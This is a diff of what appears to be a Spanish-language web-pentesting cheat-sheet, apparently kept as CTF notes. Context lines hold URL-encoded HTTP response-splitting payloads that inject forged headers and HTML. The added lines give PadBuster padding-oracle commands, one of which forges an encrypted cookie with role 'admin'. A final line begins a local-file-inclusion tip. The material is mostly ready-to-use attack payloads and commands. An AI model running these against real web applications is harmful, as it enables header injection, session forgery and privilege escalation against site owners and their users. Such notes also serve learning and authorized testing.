@@ -6,6 +6,10 @@
 	asdf%0AContent-Length%3A%200%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0APragma%3A%20No-cache%0ALast-Modified%3A%20Mon%2C%2011%20Feb%202018%2014%3A50%3A18%20GMT%0AContent-Length%3A%200
 	asdf%0AContent-Length%3A%200%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0ALast-Modified%3A%20Mon%2C%2011%20Feb%202019%2014%3A50%3A18%20GMT%0AContent-Length%3A%2050%0A%3Chtml%3E%20Prueba%20de%20Concepto%20%3C%2Fhtml%3E
 
+#Padding Oracle Attack
+https://github.com/GDSSecurity/PadBuster/
+perl padBuster.pl URL Valor-A-Testear (decodeado en caso de html encoding) 8/16 (tamaño) --cookies iknowmag1k=XXXX (decodeado en caso de html encoding)
+perl padBuster.pl URL Valor-A-Testear (decodeado en caso de html encoding) 8/16 (tamaño) --cookies iknowmag1k=XXXX (decodeado en caso de html encoding) --plaintext="{\"user\":\"asd\",\"role\":\"admin\"}"
 
 #LFI
 Si queremos enlazar un archivo y vemos que le adjunta una extensión automáticamente, llamarlo sin extensión y que se ponga después
